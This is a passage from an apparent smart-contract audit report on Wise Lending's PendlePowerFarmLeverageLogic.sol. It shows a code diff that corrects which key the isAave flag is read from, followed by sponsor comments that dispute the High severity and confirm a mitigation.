-uint256borrowShares=isAave[_nftId]+uint256borrowShares=isAave[keyId]?_getPositionBorrowSharesAave(_nftId):_getPositionBorrowShares(_nftId);
PendlePowerFarmLeverageLogic.sol#L575-L590
-addresspaybackToken=isAave[_nftId] ==true+addresspaybackToken=isAave[keyId] ==true?AAVE_WETH_ADDRESS:WETH_ADDRESS;paybackAmount=WISE_LENDING.paybackAmount(paybackToken,_shareAmountToPay);-uint256cutoffShares=isAave[_nftId] ==true+uint256cutoffShares=isAave[keyId] ==true?_getPositionBorrowSharesAave(_nftId)*FIVTY_PERCENT/PRECISION_FACTOR_E18:_getPositionBorrowShares(_nftId)*FIVTY_PERCENT/PRECISION_FACTOR_E18;
vm06007 (Wise Lending) commented:
While this is marked as High, we would like to bring this to a Medium, as there is still a way to liquidate such nft/user should that even occur (depending if there’s AavePool present etc).@vonMangoldt can provide details on how this can be mitigated and user can still be liquidated even if they would have a chance to enter with the wrongisAaveflag.
Wise Lending commented:
Mitigatedhere.

